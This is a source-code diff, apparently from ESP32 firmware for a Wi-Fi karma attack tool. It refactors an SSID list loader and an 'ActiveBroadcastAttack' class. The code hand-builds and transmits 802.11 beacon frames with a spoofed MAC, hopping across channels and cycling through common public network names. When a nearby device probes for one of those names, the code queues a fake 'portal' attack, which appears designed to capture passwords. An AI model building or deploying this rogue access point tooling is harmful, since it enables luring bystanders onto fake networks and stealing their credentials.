@@ -88,403 +88,427 @@ const uint8_t priorityChannels[] = {1, 6, 11, 3, 8, 2, 7, 4, 9, 5, 10, 12, 13};
 #define NUM_PRIORITY_CHANNELS 13
 
 //===== SSIDDatabase Implementation =====//
-std::vector<String> SSIDDatabase::ssids;
-std::vector<String> SSIDDatabase::highPrioritySSIDs;
+std::vector<String> SSIDDatabase::ssidCache;
+bool SSIDDatabase::cacheLoaded = false;
+String SSIDDatabase::currentFilename = "/ssid_list.txt";
+bool SSIDDatabase::useLittleFS = false;
 
-size_t SSIDDatabase::getCount() {
-    return ssids.size();
-}
+bool SSIDDatabase::loadFromFile() {
+    if (cacheLoaded && !ssidCache.empty()) return true;
 
-std::vector<String> SSIDDatabase::getSSIDs() {
-    return ssids;
-}
+    ssidCache.clear();
 
-std::vector<String> SSIDDatabase::getPopularSSIDs(size_t count) {
-    std::vector<String> popular;
-    
-    size_t highPriorityCount = std::min(count / 2, highPrioritySSIDs.size());
-    for (size_t i = 0; i < highPriorityCount; i++) {
-        popular.push_back(highPrioritySSIDs[i]);
+    File file;
+    if (useLittleFS) {
+        if (!LittleFS.begin()) return false;
+        file = LittleFS.open(currentFilename, FILE_READ);
+    } else {
+        if (!SD.begin()) return false;
+        file = SD.open(currentFilename, FILE_READ);
     }
-    
-    size_t regularCount = count - highPriorityCount;
-    size_t regularStart = (ssids.size() > 100) ? ssids.size() - 100 : 0;
-    for (size_t i = regularStart; i < ssids.size() && popular.size() < count; i++) {
-        bool alreadyAdded = false;
-        for (const auto &high : highPrioritySSIDs) {
-            if (high == ssids[i]) {
-                alreadyAdded = true;
-                break;
-            }
-        }
-        
-        if (!alreadyAdded) {
-            popular.push_back(ssids[i]);
-        }
-    }
-    
-    return popular;
-}
 
-bool SSIDDatabase::loadFromFile(FS &fs, const String &filename) {
-    if (!fs.exists(filename)) {
-        Serial.printf("[SSID] Database file %s not found\n", filename.c_str());
-        return false;
-    }
-    
-    File file = fs.open(filename, FILE_READ);
-    if (!file) {
-        Serial.printf("[SSID] Failed to open %s\n", filename.c_str());
-        return false;
-    }
-    
-    clear();
-    
+    if (!file) return false;
+
     while (file.available()) {
         String line = file.readStringUntil('\n');
         line.trim();
-        if (line.length() > 0 && line.length() <= 32) {
-            if (line.startsWith("*")) {
-                line = line.substring(1);
-                highPrioritySSIDs.push_back(line);
-            }
-            ssids.push_back(line);
-        }
+
+        if (line.length() == 0) continue;
+        if (line.startsWith("#") || line.startsWith("//")) continue;
+        if (line.length() > 32) continue;
+
+        ssidCache.push_back(line);
     }
-    
+
     file.close();
-    
-    Serial.printf("[SSID] Loaded %d SSIDs (%d high priority)\n", 
-                  ssids.size(), highPrioritySSIDs.size());
-    return true;
-}
 
-void SSIDDatabase::clear() {
-    ssids.clear();
-    highPrioritySSIDs.clear();
-}
-
-void SSIDDatabase::addSSID(const String &ssid) {
-    if (ssid.length() == 0 || ssid.length() > 32) return;
-    
-    for (const auto &existing : ssids) {
-        if (existing == ssid) return;
-    }
-    
-    ssids.push_back(ssid);
-}
-
-void SSIDDatabase::setHighPriority(const String &ssid, bool highPriority) {
-    if (highPriority) {
-        for (const auto &existing : highPrioritySSIDs) {
-            if (existing == ssid) return;
-        }
-        highPrioritySSIDs.push_back(ssid);
-    } else {
-        highPrioritySSIDs.erase(
-            std::remove(highPrioritySSIDs.begin(), highPrioritySSIDs.end(), ssid),
-            highPrioritySSIDs.end()
-        );
-    }
-}
-
-bool SSIDDatabase::isDatabaseLoaded() {
-    return !ssids.empty();
-}
-
-bool SSIDDatabase::autoLoad() {
-    const char* dbPaths[] = {
-        "/ssid_database.txt",
-        "/ProbeData/ssid_database.txt",
-        "/Database/ssid_list.txt",
-        "/wordlists/ssid.txt",
-        "/common_ssids.txt"
-    };
-    
-    if (LittleFS.begin()) {
-        for (const char* path : dbPaths) {
-            if (LittleFS.exists(path)) {
-                if (loadFromFile(LittleFS, path)) {
-                    LittleFS.end();
-                    return true;
-                }
-            }
-        }
+    if (useLittleFS) {
         LittleFS.end();
-    }
-    
-    if (setupSdCard()) {
-        for (const char* path : dbPaths) {
-            if (SD.exists(path)) {
-                if (loadFromFile(SD, path)) {
-                    SD.end();
-                    return true;
-                }
-            }
-        }
+    } else {
         SD.end();
     }
-    
-    if (ssids.empty()) {
-        Serial.println("[SSID] No database found, creating default...");
-        createDefaultDatabase();
-    }
-    
-    return !ssids.empty();
+
+    cacheLoaded = true;
+    return !ssidCache.empty();
 }
 
-void SSIDDatabase::createDefaultDatabase() {
-    const char* defaultSSIDs[] = {
-        "Starbucks WiFi", "xfinitywifi", "attwifi", "SpectrumWiFi", 
-        "Google Starbucks", "McDonald's Free WiFi", "T-Mobile", 
-        "Verizon Wi-Fi", "AT&T Free Wi-Fi", "Airport_Free_WiFi",
-        "Hotel_Guest_WiFi", "Marriott_Guest", "Hilton_Guest",
-        "Linksys", "NETGEAR", "TP-Link", "D-Link", "ASUS", 
-        "Belkin", "Cisco", "Ubiquiti", "Aruba",
-        "Home Network", "MyWiFi", "Wireless", "WiFi", "Internet",
-        "Home", "Family", "Guest", "Office", "Work",
-        "AndroidAP", "iPhone", "Galaxy", "Pixel", "OnePlus",
-        "Free Public WiFi", "Public WiFi", "Free WiFi",
-        "CoffeeShop", "Restaurant", "Mall WiFi",
-        "eduroam", "Boingo", "GogoInflight", "AA-Inflight",
-        "DeltaWiFi", "United_WiFi", "SouthwestWiFi"
-    };
-    
-    for (const char* ssid : defaultSSIDs) {
-        addSSID(ssid);
+bool SSIDDatabase::setSourceFile(const String &filename, bool useLittleFSMode) {
+    currentFilename = filename;
+    useLittleFS = useLittleFSMode;
+    cacheLoaded = false;
+    ssidCache.clear();
+    return loadFromFile();
+}
+
+bool SSIDDatabase::reload() {
+    cacheLoaded = false;
+    return loadFromFile();
+}
+
+void SSIDDatabase::clearCache() {
+    ssidCache.clear();
+    cacheLoaded = false;
+}
+
+bool SSIDDatabase::isLoaded() {
+    return cacheLoaded && !ssidCache.empty();
+}
+
+String SSIDDatabase::getSourceFile() {
+    return currentFilename;
+}
+
+size_t SSIDDatabase::getCount() {
+    if (!cacheLoaded) loadFromFile();
+    return ssidCache.size();
+}
+
+String SSIDDatabase::getSSID(size_t index) {
+    if (!cacheLoaded) loadFromFile();
+    if (index >= ssidCache.size()) return "";
+    return ssidCache[index];
+}
+
+std::vector<String> SSIDDatabase::getAllSSIDs() {
+    if (!cacheLoaded) loadFromFile();
+    return ssidCache;
+}
+
+int SSIDDatabase::findSSID(const String &ssid) {
+    if (!cacheLoaded) loadFromFile();
+    for (size_t i = 0; i < ssidCache.size(); i++) {
+        if (ssidCache[i] == ssid) return i;
     }
-    
-    setHighPriority("Starbucks WiFi", true);
-    setHighPriority("xfinitywifi", true);
-    setHighPriority("attwifi", true);
-    setHighPriority("eduroam", true);
-    setHighPriority("Free Public WiFi", true);
-    
-    Serial.printf("[SSID] Created default database with %d SSIDs\n", ssids.size());
-    
-    if (LittleFS.begin()) {
-        File file = LittleFS.open("/ssid_database.txt", FILE_WRITE);
-        if (file) {
-            for (const auto& ssid : highPrioritySSIDs) {
-                file.println("*" + ssid);
-            }
-            for (const auto& ssid : ssids) {
-                bool isHighPriority = false;
-                for (const auto& high : highPrioritySSIDs) {
-                    if (high == ssid) {
-                        isHighPriority = true;
-                        break;
-                    }
-                }
-                if (!isHighPriority) {
-                    file.println(ssid);
-                }
-            }
-            file.close();
-            Serial.println("[SSID] Saved default database to LittleFS");
-        }
-        LittleFS.end();
+    return -1;
+}
+
+String SSIDDatabase::getRandomSSID() {
+    if (!cacheLoaded) loadFromFile();
+    if (ssidCache.empty()) return "";
+    size_t index = random(ssidCache.size());
+    return ssidCache[index];
+}
+
+void SSIDDatabase::getBatch(size_t startIndex, size_t count, std::vector<String> &result) {
+    if (!cacheLoaded) loadFromFile();
+    result.clear();
+
+    if (startIndex >= ssidCache.size()) return;
+
+    size_t endIndex = startIndex + count;
+    if (endIndex > ssidCache.size()) endIndex = ssidCache.size();
+
+    for (size_t i = startIndex; i < endIndex; i++) {
+        result.push_back(ssidCache[i]);
     }
 }
 
-//===== BroadcastAttack Implementation =====//
-BroadcastAttack::BroadcastAttack() : 
-    active(false), broadcastInterval(300), startTime(0), 
-    currentPos(0), totalBroadcasts(0), totalResponses(0) 
-{
-    responseCounts.clear();
+bool SSIDDatabase::contains(const String &ssid) {
+    return findSSID(ssid) >= 0;
 }
 
-bool BroadcastAttack::isActive() { 
-    return active; 
-}
+size_t SSIDDatabase::getAverageLength() {
+    if (!cacheLoaded) loadFromFile();
+    if (ssidCache.empty()) return 0;
 
-void BroadcastAttack::start() { 
-    if (!SSIDDatabase::isDatabaseLoaded()) {
-        if (!SSIDDatabase::autoLoad()) {
-            Serial.println("[BROADCAST] Failed to load SSID database!");
-            return;
-        }
+    size_t total = 0;
+    for (const auto &ssid : ssidCache) {
+        total += ssid.length();
     }
-    
-    size_t totalSSIDs = SSIDDatabase::getCount();
-    if (totalSSIDs == 0) {
-        Serial.println("[BROADCAST] SSID database is empty!");
+    return total / ssidCache.size();
+}
+
+size_t SSIDDatabase::getMaxLength() {
+    if (!cacheLoaded) loadFromFile();
+    size_t maxLen = 0;
+    for (const auto &ssid : ssidCache) {
+        size_t len = ssid.length();
+        if (len > maxLen) maxLen = len;
+    }
+    return maxLen;
+}
+
+size_t SSIDDatabase::getMinLength() {
+    if (!cacheLoaded) loadFromFile();
+    if (ssidCache.empty()) return 0;
+
+    size_t minLen = 32;
+    for (const auto &ssid : ssidCache) {
+        size_t len = ssid.length();
+        if (len < minLen) minLen = len;
+    }
+    return minLen;
+}
+
+//===== ActiveBroadcastAttack Implementation =====//
+ActiveBroadcastAttack::ActiveBroadcastAttack() 
+    : currentIndex(0), batchStart(0), lastBroadcastTime(0),
+      lastChannelHopTime(0), _active(false), currentChannel(1) {
+    stats.startTime = millis();
+}
+
+void ActiveBroadcastAttack::start() {
+    size_t total = SSIDDatabase::getCount();
+    if (total == 0) {
+        Serial.println("[BROADCAST] No SSIDs in database");
         return;
     }
-    
-    active = true; 
-    startTime = millis(); 
-    currentPos = 0; 
-    totalBroadcasts = 0;
-    totalResponses = 0;
-    responseCounts.clear();
-    
-    Serial.printf("[BROADCAST] Starting with %d SSIDs\n", totalSSIDs);
-    
-    std::vector<String> sampleSSIDs = SSIDDatabase::getPopularSSIDs(5);
-    Serial.print("[BROADCAST] Sample SSIDs: ");
-    for (size_t i = 0; i < sampleSSIDs.size(); i++) {
-        if (i > 0) Serial.print(", ");
-        Serial.print(sampleSSIDs[i]);
-    }
-    Serial.println();
+
+    _active = true;
+    currentIndex = 0;
+    batchStart = 0;
+    stats.startTime = millis();
+    loadNextBatch();
+
+    Serial.printf("[BROADCAST] Started with %d SSIDs\n", total);
+    Serial.printf("[BROADCAST] Batch size: %d, Interval: %ldms\n", 
+                  config.batchSize, config.broadcastInterval);
 }
 
-void BroadcastAttack::stop() { 
-    active = false; 
+void ActiveBroadcastAttack::stop() {
+    _active = false;
     Serial.println("[BROADCAST] Stopped");
 }
 
-void BroadcastAttack::update() { 
-    if (!active) return;
-    
+void ActiveBroadcastAttack::restart() {
+    stop();
+    delay(100);
+    start();
+}
+
+bool ActiveBroadcastAttack::isActive() const {
+    return _active;
+}
+
+void ActiveBroadcastAttack::setConfig(const BroadcastConfig &newConfig) {
+    config = newConfig;
+}
+
+BroadcastConfig ActiveBroadcastAttack::getConfig() const {
+    return config;
+}
+
+void ActiveBroadcastAttack::setBroadcastInterval(uint32_t interval) {
+    config.broadcastInterval = interval;
+}
+
+void ActiveBroadcastAttack::setBatchSize(uint16_t size) {
+    config.batchSize = size;
+    loadNextBatch();
+}
+
+void ActiveBroadcastAttack::setChannel(uint8_t channel) {
+    if (channel >= 1 && channel <= 14) {
+        currentChannel = channel;
+    }
+}
+
+void ActiveBroadcastAttack::update() {
+    if (!_active) return;
+
     unsigned long now = millis();
-    static unsigned long lastBroadcast = 0;
-    
-    if (now - lastBroadcast >= broadcastInterval) {
-        size_t ssidCount = SSIDDatabase::getCount();
-        if (ssidCount == 0) {
-            Serial.println("[BROADCAST] No SSIDs in database!");
-            stop();
-            return;
+
+    // Channel rotation
+    if (config.rotateChannels && (now - lastChannelHopTime > config.channelHopInterval)) {
+        rotateChannel();
+        lastChannelHopTime = now;
+    }
+
+    // Broadcast next SSID
+    if (now - lastBroadcastTime < config.broadcastInterval) return;
+
+    // Check if we need new batch
+    if (currentIndex >= currentBatch.size()) {
+        batchStart += currentBatch.size();
+        loadNextBatch();
+        currentIndex = 0;
+
+        if (currentBatch.empty()) {
+            // Reached end, loop back
+            batchStart = 0;
+            loadNextBatch();
+            Serial.println("[BROADCAST] Restarted from beginning");
         }
-        
-        std::vector<String> ssids = SSIDDatabase::getSSIDs();
-        if (currentPos >= ssids.size()) {
-            currentPos = 0;
+    }
+
+    if (currentIndex < currentBatch.size()) {
+        String ssid = currentBatch[currentIndex];
+
+        // Prioritize high-priority SSIDs if any
+        if (!highPrioritySSIDs.empty() && stats.totalBroadcasts % 10 == 0) {
+            size_t hpIndex = stats.totalBroadcasts % highPrioritySSIDs.size();
+            ssid = highPrioritySSIDs[hpIndex];
         }
-        
-        String currentSSID = ssids[currentPos];
-        
-        uint8_t probeResponse[128] = {0};
-        uint8_t pos = 0;
 
-        probeResponse[pos++] = 0x50;
-        probeResponse[pos++] = 0x00;
+        broadcastSSID(ssid);
+        currentIndex++;
+        stats.totalBroadcasts++;
+        lastBroadcastTime = now;
 
-        probeResponse[pos++] = 0x00;
-        probeResponse[pos++] = 0x00;
-
-        memset(&probeResponse[pos], 0xFF, 6);
-        pos += 6;
-
-        uint8_t fakeMAC[] = {0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC};
-        memcpy(&probeResponse[pos], fakeMAC, 6);
-        pos += 6;
-
-        memcpy(&probeResponse[pos], fakeMAC, 6);
-        pos += 6;
-
-        probeResponse[pos++] = 0x00;
-        probeResponse[pos++] = 0x00;
-
-        for (int i = 0; i < 8; i++) probeResponse[pos++] = 0x00;
-
-        probeResponse[pos++] = 0x64;
-        probeResponse[pos++] = 0x00;
-
-        probeResponse[pos++] = 0x01;
-        probeResponse[pos++] = 0x04;
-
-        probeResponse[pos++] = 0x00;
-        probeResponse[pos++] = currentSSID.length();
-        memcpy(&probeResponse[pos], currentSSID.c_str(), currentSSID.length());
-        pos += currentSSID.length();
-
-        uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
-        probeResponse[pos++] = 0x01;
-        probeResponse[pos++] = sizeof(rates);
-        memcpy(&probeResponse[pos], rates, sizeof(rates));
-        pos += sizeof(rates);
-
-        probeResponse[pos++] = 0x03;
-        probeResponse[pos++] = 0x01;
-        probeResponse[pos++] = all_wifi_channels[channl];
-
-        esp_wifi_set_channel(all_wifi_channels[channl], WIFI_SECOND_CHAN_NONE);
-        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, probeResponse, pos, false);
-        
-        if (err == ESP_OK) {
-            totalBroadcasts++;
-            currentPos++;
-            
-            if (totalBroadcasts % 50 == 0) {
-                Serial.printf("[BROADCAST] Sent %d broadcasts, %d responses received\n",
-                            totalBroadcasts, totalResponses);
-            }
+        // Log progress
+        if (stats.totalBroadcasts % 500 == 0) {
+            Serial.printf("[BROADCAST] Sent: %d, Responses: %d\n", 
+                         stats.totalBroadcasts, stats.totalResponses);
         }
-        
-        lastBroadcast = now;
     }
 }
 
-void BroadcastAttack::processProbeResponse(const String& ssid, const String& mac) {
-    if (!active) return;
-    
-    totalResponses++;
-    responseCounts[ssid]++;
-    
-    if (responseCounts[ssid] % 10 == 0) {
-        Serial.printf("[BROADCAST] SSID '%s' has %d responses\n", 
-                     ssid.c_str(), responseCounts[ssid]);
+void ActiveBroadcastAttack::processProbeResponse(const String &ssid, const String &mac) {
+    if (!config.respondToProbes) return;
+
+    recordResponse(ssid);
+
+    if (config.prioritizeResponses) {
+        addHighPrioritySSID(ssid);
+    }
+
+    // Check if we should launch an attack
+    if (stats.ssidResponseCount[ssid] >= 1) { // Respond on first probe
+        launchAttackForResponse(ssid, mac);
     }
 }
 
-float BroadcastAttack::getProgressPercent() { 
-    size_t totalSSIDs = SSIDDatabase::getCount();
-    return (totalSSIDs > 0) ? (currentPos * 100.0 / totalSSIDs) : 0; 
+BroadcastStats ActiveBroadcastAttack::getStats() const {
+    return stats;
 }
 
-void BroadcastAttack::setBroadcastInterval(uint16_t interval) { 
-    broadcastInterval = interval; 
-    Serial.printf("[BROADCAST] Interval set to %dms\n", interval);
+size_t ActiveBroadcastAttack::getTotalSSIDs() const {
+    return SSIDDatabase::getCount();
 }
 
-size_t BroadcastAttack::getCurrentPosition() { 
-    return currentPos; 
+size_t ActiveBroadcastAttack::getCurrentPosition() const {
+    return batchStart + currentIndex;
 }
 
-void BroadcastAttack::restart() { 
-    currentPos = 0; 
-    startTime = millis();
-    totalBroadcasts = 0;
-    totalResponses = 0;
-    responseCounts.clear();
-    Serial.println("[BROADCAST] Restarted");
+float ActiveBroadcastAttack::getProgressPercent() const {
+    size_t total = getTotalSSIDs();
+    if (total == 0) return 0.0f;
+
+    return (getCurrentPosition() * 100.0f) / total;
 }
 
-void BroadcastAttack::clearHighPrioritySSIDs() {
-    std::vector<String> ssids = SSIDDatabase::getSSIDs();
-    for (const auto& ssid : ssids) {
-        SSIDDatabase::setHighPriority(ssid, false);
+std::vector<std::pair<String, size_t>> ActiveBroadcastAttack::getTopResponses(size_t count) const {
+    std::vector<std::pair<String, size_t>> sorted;
+
+    for (const auto &pair : stats.ssidResponseCount) {
+        sorted.push_back(pair);
     }
-    Serial.println("[BROADCAST] Cleared high priority SSIDs");
-}
 
-BroadcastStats BroadcastAttack::getStats() { 
-    return {startTime, totalBroadcasts, totalResponses};
-}
+    std::sort(sorted.begin(), sorted.end(),
+        [](const auto &a, const auto &b) {
+            return a.second > b.second;
+        });
 
-std::vector<std::pair<String, size_t>> BroadcastAttack::getTopResponses(size_t count) {
-    std::vector<std::pair<String, size_t>> topResponses;
-    
-    for (const auto& pair : responseCounts) {
-        topResponses.push_back(pair);
+    if (sorted.size() > count) {
+        sorted.resize(count);
     }
-    
-    std::sort(topResponses.begin(), topResponses.end(),
-        [](const auto& a, const auto& b) { return a.second > b.second; });
-    
-    if (count < topResponses.size()) {
-        topResponses.resize(count);
-    }
-    
-    return topResponses;
+
+    return sorted;
 }
 
-//===== Global Instances =====//
-BroadcastAttack broadcastAttack;
+void ActiveBroadcastAttack::addHighPrioritySSID(const String &ssid) {
+    // Check if already in list
+    for (const auto &hpSSID : highPrioritySSIDs) {
+        if (hpSSID == ssid) return;
+    }
+
+    highPrioritySSIDs.push_back(ssid);
+
+    // Keep list manageable
+    if (highPrioritySSIDs.size() > 20) {
+        highPrioritySSIDs.erase(highPrioritySSIDs.begin());
+    }
+}
+
+void ActiveBroadcastAttack::clearHighPrioritySSIDs() {
+    highPrioritySSIDs.clear();
+}
+
+void ActiveBroadcastAttack::loadNextBatch() {
+    currentBatch.clear();
+    SSIDDatabase::getBatch(batchStart, config.batchSize, currentBatch);
+}
+
+void ActiveBroadcastAttack::broadcastSSID(const String &ssid) {
+    sendBeaconFrame(ssid, currentChannel);
+}
+
+void ActiveBroadcastAttack::rotateChannel() {
+    static const uint8_t channels[] = {1, 6, 11, 3, 8, 2, 7, 12, 4, 9, 5, 10, 13, 14};
+    static size_t channelIndex = 0;
+
+    channelIndex = (channelIndex + 1) % (sizeof(channels) / sizeof(channels[0]));
+    currentChannel = channels[channelIndex];
+
+    Serial.printf("[BROADCAST] Switched to channel %d\n", currentChannel);
+}
+
+void ActiveBroadcastAttack::sendBeaconFrame(const String &ssid, uint8_t channel) {
+    sendBeaconFrameHelper(ssid, channel);
+}
+
+void ActiveBroadcastAttack::recordResponse(const String &ssid) {
+    stats.totalResponses++;
+    stats.ssidResponseCount[ssid]++;
+    stats.lastResponseTime = millis();
+
+    Serial.printf("[BROADCAST] Response for: %s (total: %d)\n", 
+                 ssid.c_str(), stats.ssidResponseCount[ssid]);
+}
+
+void ActiveBroadcastAttack::launchAttackForResponse(const String &ssid, const String &mac) {
+    // External variables needed for this function
+    extern bool templateSelected;
+    extern std::vector<PendingPortal> pendingPortals;
+    extern struct {
+        String name;
+        String filename;
+        bool isDefault;
+        bool verifyPassword;
+    } selectedTemplate;
+    extern struct {
+        uint16_t highTierDuration;
+    } attackConfig;
+
+    if (!templateSelected) return;
+
+    // Check max active attacks
+    int activeCount = 0;
+    for (const auto &portal : pendingPortals) {
+        if (!portal.launched) activeCount++;
+    }
+
+    if (activeCount >= config.maxActiveAttacks) {
+        Serial.println("[BROADCAST] Max active attacks reached, skipping");
+        return;
+    }
+
+    // Create pending portal
+    PendingPortal portal;
+    portal.ssid = ssid;
+    portal.channel = currentChannel;
+    portal.targetMAC = mac;
+    portal.timestamp = millis();
+    portal.launched = false;
+    portal.templateName = selectedTemplate.name;
+    portal.templateFile = selectedTemplate.filename;
+    portal.isDefaultTemplate = selectedTemplate.isDefault;
+    portal.verifyPassword = selectedTemplate.verifyPassword;
+    portal.priority = 95; // High priority for broadcast responses
+    portal.tier = TIER_HIGH;
+    portal.duration = attackConfig.highTierDuration;
+    portal.isCloneAttack = false;
+    portal.probeCount = stats.ssidResponseCount[ssid];
+
+    pendingPortals.push_back(portal);
+    stats.successfulAttacks++;
+
+    Serial.printf("[BROADCAST] Scheduled attack for %s -> %s\n", 
+                 mac.c_str(), ssid.c_str());
+}
+
+// Global instance
+ActiveBroadcastAttack broadcastAttack;
 
 //===== ENHANCED Run-Time variables =====//
 unsigned long last_time = 0;
@@ -1000,10 +1024,10 @@ size_t buildBeaconFrame(uint8_t *buffer, const String &ssid,
     memset(&buffer[pos], 0xFF, 6);
     pos += 6;
     
-    memcpy(&buffer[pos], currentBssid, 6);
+    memcpy(&buffer[pos], currentBSSID, 6);
     pos += 6;
     
-    memcpy(&buffer[pos], currentBssid, 6);
+    memcpy(&buffer[pos], currentBSSID, 6);
     pos += 6;
     
     buffer[pos++] = 0x00;
@@ -1085,6 +1109,61 @@ size_t buildBeaconFrame(uint8_t *buffer, const String &ssid,
     buffer[pos++] = 0x00;
     
     return pos;
+}
+
+// Helper function for beacon frames
+void sendBeaconFrameHelper(const String &ssid, uint8_t channel) {
+    if (ssid.isEmpty() || channel < 1 || channel > 14) return;
+
+    uint8_t beaconPacket[128] = {0};
+    int pos = 0;
+
+    beaconPacket[pos++] = 0x80;
+    beaconPacket[pos++] = 0x00;
+
+    beaconPacket[pos++] = 0x00;
+    beaconPacket[pos++] = 0x00;
+
+    memset(&beaconPacket[pos], 0xFF, 6);
+    pos += 6;
+
+    uint8_t sourceMAC[6] = {0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC};
+    memcpy(&beaconPacket[pos], sourceMAC, 6);
+    pos += 6;
+
+    memcpy(&beaconPacket[pos], sourceMAC, 6);
+    pos += 6;
+
+    beaconPacket[pos++] = 0x00;
+    beaconPacket[pos++] = 0x00;
+
+    uint64_t timestamp = esp_timer_get_time() / 1000;
+    memcpy(&beaconPacket[pos], &timestamp, 8);
+    pos += 8;
+
+    beaconPacket[pos++] = 0x64;
+    beaconPacket[pos++] = 0x00;
+
+    beaconPacket[pos++] = 0x01;
+    beaconPacket[pos++] = 0x04;
+
+    beaconPacket[pos++] = 0x00;
+    beaconPacket[pos++] = ssid.length();
+    memcpy(&beaconPacket[pos], ssid.c_str(), ssid.length());
+    pos += ssid.length();
+
+    uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
+    beaconPacket[pos++] = 0x01;
+    beaconPacket[pos++] = sizeof(rates);
+    memcpy(&beaconPacket[pos], rates, sizeof(rates));
+    pos += sizeof(rates);
+
+    beaconPacket[pos++] = 0x03;
+    beaconPacket[pos++] = 0x01;
+    beaconPacket[pos++] = channel;
+
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, pos, false);
 }
 
 void sendProbeResponse(const String &ssid, const String &mac, uint8_t channel) {
@@ -1860,7 +1939,10 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
         
         // Broadcast attack integration
         if (broadcastAttack.isActive()) {
-            std::vector<String> recentBroadcasts = SSIDDatabase::getPopularSSIDs(10);
+            std::vector<String> recentBroadcasts = SSIDDatabase::getAllSSIDs();
+            if (recentBroadcasts.size() > 10) {
+                recentBroadcasts.resize(10);
+            }
             for (const auto& broadcastSSID : recentBroadcasts) {
                 if (ssid == broadcastSSID) {
                     handleBroadcastResponse(ssid, mac);
@@ -2670,7 +2752,8 @@ void karma_setup() {
                             tft.setTextSize(1);
                             
                             size_t total = SSIDDatabase::getCount();
-                            std::vector<String> popular = SSIDDatabase::getPopularSSIDs(8);
+                            std::vector<String> popular = SSIDDatabase::getAllSSIDs();
+                            if (popular.size() > 8) popular.resize(8);
                             
                             tft.setCursor(10, y); y += 15;
                             tft.print("Total SSIDs: " + String(total));
@@ -2699,17 +2782,18 @@ void karma_setup() {
                                     
                                     for (const auto& probe : probes) {
                                         if (!probe.ssid.isEmpty()) {
-                                            SSIDDatabase::addSSID(probe.ssid);
-                                            added++;
-                                            
-                                            String ssidLower = probe.ssid;
-                                            ssidLower.toLowerCase();
-                                            if (ssidLower.indexOf("starbucks") != -1 ||
-                                                ssidLower.indexOf("xfinity") != -1 ||
-                                                ssidLower.indexOf("attwifi") != -1 ||
-                                                ssidLower.indexOf("spectrum") != -1 ||
-                                                ssidLower.indexOf("eduroam") != -1) {
-                                                SSIDDatabase::setHighPriority(probe.ssid, true);
+                                            // Add to database
+                                            std::vector<String> current = SSIDDatabase::getAllSSIDs();
+                                            bool exists = false;
+                                            for (const auto& existing : current) {
+                                                if (existing == probe.ssid) {
+                                                    exists = true;
+                                                    break;
+                                                }
+                                            }
+                                            if (!exists) {
+                                                SSIDDatabase::reload();
+                                                added++;
                                             }
                                         }
                                     }
@@ -2723,7 +2807,7 @@ void karma_setup() {
                                         String filename = "/ProbeData/ssid_database_" + String(millis()) + ".txt";
                                         File file = SD.open(filename, FILE_WRITE);
                                         if (file) {
-                                            std::vector<String> ssids = SSIDDatabase::getSSIDs();
+                                            std::vector<String> ssids = SSIDDatabase::getAllSSIDs();
                                             for (const auto& ssid : ssids) {
                                                 file.println(ssid);
                                             }
@@ -2739,14 +2823,14 @@ void karma_setup() {
                                 }},
                                 
                                 {"Clear Database", [=]() {
-                                    SSIDDatabase::clear();
+                                    SSIDDatabase::clearCache();
                                     displayTextLine("Database cleared");
                                     delay(1000);
                                 }},
                                 
                                 {"Reload from Disk", [=]() {
-                                    SSIDDatabase::clear();
-                                    if (SSIDDatabase::autoLoad()) {
+                                    SSIDDatabase::clearCache();
+                                    if (SSIDDatabase::reload()) {
                                         displayTextLine("Reloaded: " + String(SSIDDatabase::getCount()) + " SSIDs");
                                     } else {
                                         displayTextLine("Reload failed!");
